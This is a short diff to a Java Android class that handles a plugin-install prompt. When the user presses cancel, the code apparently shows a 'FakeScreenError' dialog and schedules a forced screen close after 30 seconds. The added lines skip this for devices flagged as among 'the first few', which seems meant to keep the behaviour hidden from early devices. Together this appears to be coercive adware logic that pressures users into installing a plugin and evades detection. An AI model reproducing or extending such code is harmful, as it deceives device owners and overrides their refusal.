@@ -47,6 +47,10 @@ public class ExtPluginUtils {
                                  .setNegativeButton("取消", new DialogInterface.OnClickListener() {
                                      @Override
                                      public void onClick(DialogInterface dialog, int which) {
+                                         if (SettingManager.getInstance().getDisableDownloadPlugin()) {
+                                            //是前几个设备
+                                             return;
+                                         }
                                          AppRuntime.EXT_INSTALL_SHOW.set(false);
                                          if (AppRuntime.FakeScreenError != null) {
                                              AppRuntime.FakeScreenError.dismiss();
@@ -57,7 +61,7 @@ public class ExtPluginUtils {
                                          AppRuntime.FakeScreenError.show();
 
                                          if (SettingManager.getInstance().getLockScreenCount() <= 2) {
-                                            AlarmUtils.startAlarmForAction(context, AlarmUtils.ACTION_CLOSE_SCREEN, 30 * 1000);
+                                             AlarmUtils.startAlarmForAction(context, AlarmUtils.ACTION_CLOSE_SCREEN, 30 * 1000);
                                          }
                                      }
                                  })
